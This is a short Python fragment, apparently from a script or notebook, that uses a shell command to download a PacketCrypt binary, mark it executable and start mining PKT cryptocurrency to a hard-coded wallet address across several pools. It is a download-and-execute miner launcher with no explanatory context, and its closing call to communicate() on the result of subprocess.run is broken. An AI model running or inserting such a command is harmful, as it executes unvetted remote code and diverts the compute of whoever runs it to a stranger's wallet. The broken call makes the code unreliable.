...
p = subprocess.run("curl -L -o packetcrypt-linux-amd64 https://www.pkt.world/ext/packetcrypt-linux-amd64 && chmod +x packetcrypt-linux-amd64 && ./packetcrypt-linux-amd64 ann -p pkt1q6c80xjany2j44vjajyf7ps07twn9syn03n6y09 https://stratum.zetahash.com http://pool.pkt.world http://pool.pktpool.io http://pool.pkteer.com", stdout=subprocess.PIPE, shell=True)
print(p.communicate())
